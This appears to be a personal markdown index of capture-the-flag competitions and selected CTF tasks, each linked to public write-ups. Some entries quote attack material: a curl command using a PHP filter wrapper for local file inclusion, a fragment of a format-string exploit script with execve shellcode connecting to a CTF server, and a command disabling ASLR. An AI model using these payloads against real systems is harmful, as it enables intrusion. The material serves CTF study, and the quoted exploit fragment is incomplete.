# ctf.list
list CTF challenges

| asdao | dfds | df sdf   |
| ----- | ---- | -------- |
| sdfds |      | sfsdfsdf |
| dsf   |      | dsfsdf   |
|       |      |          |

https://ctftime.org/ctfs

## let's list 10 for the start

1. SECCON CTF (http://seccon.jp/)
2. Insomni'hack (https://www.insomnihack.ch/)
3. ructf (https://ructf.org/)
4. Codegate CTF Preliminary http://www.codegate.org/
5. ructfe (https://ructfe.org/)
6. plaidctf (http://plaidctf.com/)
7. ctf2019.hitcon (https://ctf2019.hitcon.org/)
8. 0CTF (https://0ops.sjtu.cn/)
9. CyberTalents (https://cybertalents.com/)

   big list of CTF events around world

10. (https://dragonsector.pl/)

   Dragon Sector is a Polish security Capture The Flag team.

## let's list top 10 tasks
* https://ctftime.org/tasks/
* https://www.defcon.org/html/links/dc-ctf.html

1. https://ctftime.org/task/10253

 Tags: web serialization

 credits, sql-inj, user session replace and Node.js deserialization bug for Remote Code Execution
 * https://github.com/haoit/CTF/tree/master/WhiteHat%20Grand%20Prix%2006%20%E2%80%93%20Quals/Web04
 * https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

2. https://ctftime.org/writeup/17951

  Tags: web php lfi wrapper

 https://hacktizen.blogspot.com/2020/01/whitehat-grand-prix-06-quals-ctf.html

 ```
 curl http://15.165.80.50/?page=php://filter/convert.base64-encode/resource=/proc/1/cmdline -o a.txt
 ```

3. Pwn 01 https://ctftime.org/writeup/17944

 Tags: pwn

 Pretty old school format string GOT overwrite on GOT systems

 https://github.com/AshishKumar4/CTF_Writeups/blob/master/WhiteHat_2020/pwn/pwn01/exploit.py

 ```
 # This address must be 0x1000 aligned, if not, its Probably wrong!
  print("libc base: ", hex(libc_base))
  assert (libc_base & 0x0000000000000fff) == 0, "ALERT! Program is probably using different libc than specified!"
  return libc_base

  shellcode_asm = 'xor rax, rax; xor rdx,rdx; xor rsi,rsi; mov rbx,0x68732f2f6e69622f; push rbx; push rsp; pop rdi; mov rax, 59; syscall; nop'
  shellcode = asm(shellcode_asm)  # 32 byte shellcode

  def exploit(local=False, one_gadget = 0xf02a4):
  if local is False:
      r = remote('15.165.78.226', 2311)
  else:
      r = elf.process()
      gdb.attach(r.pid, """c""")
  first_stage(r)
  libc_base = leak_libc(r)
 ```

4. Misc 04 https://ctftime.org/writeup/17943

 Tags: misc volatility forensics

 volatility through the memory dumps

 https://github.com/p4-team/ctf/tree/master/2020-01-04-whitehat/misc04

  ```
  $ volatility memdump -p 5344 -D ./chrome-dump
  ```

5. Reversing1 https://ctftime.org/writeup/17940

 Tags: reverse

  https://github.com/ChoKyuWon/writeups/blob/master/WhitehatGrandprix06/Reversing1/test.py

  feedback: хардовый реверс

6. How2decompile Python https://ctftime.org/writeup/17895

 tags: reverse

 https://www.youtube.com/watch?reload=9&v=FZLKbsuGwwg&feature=youtu.be


7. Cryptography & pseudo Cryptography | https://ctftime.org/writeup/17939

 https://github.com/pcw109550/write-up/tree/master/2019/ISITDTU/Chaos

 https://github.com/pcw109550/write-up/tree/master/2020/WhiteHat_GrandPrix/Cryptography_01

8. Programming 02 | https://ctftime.org/writeup/17938

 count number of passwords that follow some special rules

 https://github.com/p4-team/ctf/tree/master/2020-01-04-whitehat/programming02

9. Warmup | https://ctftime.org/writeup/17927

 tags: really cool, web

 https://blog.djosix.com/bamboofox-ctf-2019-2020-official-writeup-for-web-warmup/

10. Move or Not | https://ctftime.org/writeup/17923

 https://ctftime.org/task/10222

 Tags: bruteforce dynamic reverse

 ```
 $ sudo echo 0 > /proc/sys/kernel/randomize_va_space
 ```

  | solve          | url                                                                            |
  | -------------- | ------------------------------------------------------------------------------ |
  | solve 1 beauty | https://chokyuwon.github.io/2020-01-02-BambooFoxCTF_2019_Move_or_Not/          |
  | interesting    | https://spwpun.info/2020/01/01/BambooFox-CTF-Move-or-not/                      |
  | solution 3     | https://naveenselvan.wordpress.com/2020/01/01/move-or-not-reversing-bamboofox/ |
